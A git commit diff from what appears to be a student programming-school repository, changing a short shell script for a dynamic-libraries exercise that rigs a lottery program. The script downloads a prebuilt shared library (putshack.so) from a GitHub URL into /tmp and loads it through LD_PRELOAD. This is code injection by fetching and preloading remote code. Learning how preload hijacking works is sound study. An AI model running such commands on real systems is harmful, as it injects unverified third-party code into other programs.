2daafee92bece18d725f7124adc891b61074114b
AmazedWonder <giftedwonda@gmail.com>
2023-09-07 03:52:56 +0100

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-#wget -P /tmp https://github.com/sidneyriffic/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
-#export LD_PRELOAD=/tmp/putshack.so
-wget -P /tmp https://github.com/alx-tools/0x18.c/raw/master/101-md5_gm/putshack.so
+wget -P /tmp https://github.com/sidneyriffic/holbertonschool-low_level_programming/raw/master/0x17-dynamic_libraries/putshack.so
 export LD_PRELOAD=/tmp/putshack.so
+# wget -P /tmp https://github.com/alx-tools/0x18.c/raw/master/101-md5_gm/putshack.so
+# export LD_PRELOAD=/tmp/putshack.so
